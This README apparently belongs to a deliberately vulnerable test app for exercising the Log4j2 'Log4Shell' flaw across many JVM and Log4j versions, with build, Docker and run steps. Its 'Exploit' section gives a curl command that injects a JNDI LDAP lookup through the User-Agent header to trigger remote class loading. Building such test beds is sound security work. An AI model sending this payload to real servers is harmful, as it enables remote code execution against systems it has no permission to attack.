# Example App for log4j2 testing purposes

### Setup

You will need to install:

```
docker
docker-compose
```

If you want to run the resulting JAR files directly on your host, you will need to install JDK8 or JDK11 depending on
what testing is to be performed. 

> Note: Currently the project targets only those JDK versions

### Build


> NOTE on versions:
> 
> There is a huge number of combinations of JVM version and Log4j versions.  By default, the build scripts and the
> docker-compose setup uses a subset of these combinations.  The subset is JVM 8/11 and Log4j vulnerable versions, but
> the last Z for each minor (i.e., 2.15.0, 2.14.1, 2.13.1, etc).
>
> If you want to build and run ALL the versions use the `build_all.sh` and `docker-compose-all.yml` files in place of the
> build.sh and docker-compose.yml files mentioned in the details below.

You first need to build all the JAR files (if desired, test single versions see `Build JAR for single version`). 

```
bash -x ./build/build.sh
```

> NOTE: Customize for the versions you want to create


If you want to run a build manually; this is the command

```
LOG4J_VERSION=2.6.1 mvn clean assembly:assembly -DdescriptorId=jar-with-dependencies
```

You must set the LOG4J_VERSION env var or the pom is invalid


### Run

Manually running one version on a host directly: 

> NOTE: This assumes you have the proper JRE version installed!

```
PORT=8080 java -jar <jar> # You must set the PORT or it will error!
```

Running inside of a docker container (see docker-compose.yml for additional info)

```
docker-compose [-f docker-compose.yml] up [image]
```


### Exploit

Send a properly formated jdni:ldap message as your user agent, example:

```
curl 127.0.0.1:8080/ -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}'
```


### Build JAR for single version

Where the first argument is the Java version and the second is the LOG4J_VERSION.  Once built, and individual version
can be started with docker-compose via `docker-compose up log4j_1.8_2.15.0` (see docker-compose.yml for configured
versions).

```
bash -x ./build/build_one.sh 1.8 2.15.0
```
